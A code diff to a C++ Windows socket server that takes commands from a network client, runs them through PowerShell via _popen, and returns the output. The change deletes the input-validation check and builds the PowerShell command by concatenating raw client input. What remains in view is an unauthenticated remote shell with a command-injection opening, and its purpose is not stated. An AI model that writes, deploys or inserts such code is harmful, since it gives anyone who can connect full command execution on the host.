@@ -103,7 +103,7 @@ bool executeCommand(SOCKET clientSocket) {
     }
 
     if (recvResult == 0) {
-        std::cerr << "Client Gracefully disconnected (no data received)" << std::endl;
+        std::cerr << "Client gracefully disconnected (no data received)" << std::endl;
         return false;  // Client closed connection
     }
 
@@ -117,16 +117,12 @@ bool executeCommand(SOCKET clientSocket) {
         return false;  // End loop if exit command received
     }
 
-    // Validate the command input (e.g., ensure it is not empty or malicious)
-    if (strlen(buffer) == 0) {
-        const char* errorMsg = "Invalid command. Please try again.\n";
-        send(clientSocket, errorMsg, strlen(errorMsg), 0);
-        return true;  // Continue listening for further commands
-    }
+    // Creates powershell command string
+    std::string command = "Powershell -Command \"" + std::string(buffer) + "\"";
 
     // Execute the command
-    FILE* pipe = _popen(buffer, "r");
-    if (!pipe) {
+    FILE* pipe = _popen(command.c_str(), "r");  // Use `command` instead of `buffer`
+    if (pipe == NULL) {
         const char* errorMsg = "Failed to execute command. Ensure the command is valid.\n";
         send(clientSocket, errorMsg, strlen(errorMsg), 0);
         return true;  // Continue listening for further commands
@@ -135,12 +131,23 @@ bool executeCommand(SOCKET clientSocket) {
     // Read output of the command
     char commandOutput[BUFFER_SIZE];
     std::string fullOutput;
-    while (fgets(commandOutput, BUFFER_SIZE, pipe) != NULL) {
+    while (fgets(commandOutput, sizeof(commandOutput), pipe) != NULL) {
         fullOutput += commandOutput;
     }
-    _pclose(pipe);
 
-    // Send output back to client
+    // Close the pipe and check the exit code
+    int exitCode = _pclose(pipe);
+
+    // Handle empty output
+    if (fullOutput.empty()) {
+        if (exitCode == 0) {
+            fullOutput = "Command executed successfully, but there was no output.\n";
+        } else {
+            fullOutput = "Command failed to execute. Exit code: " + std::to_string(exitCode) + "\n";
+        }
+    }
+
+    // Send output (or fallback message) back to the client
     int sendResult = send(clientSocket, fullOutput.c_str(), fullOutput.size(), 0);
     if (sendResult == SOCKET_ERROR) {
         std::cerr << "Failed to send command output, error: " << WSAGetLastError() << std::endl;
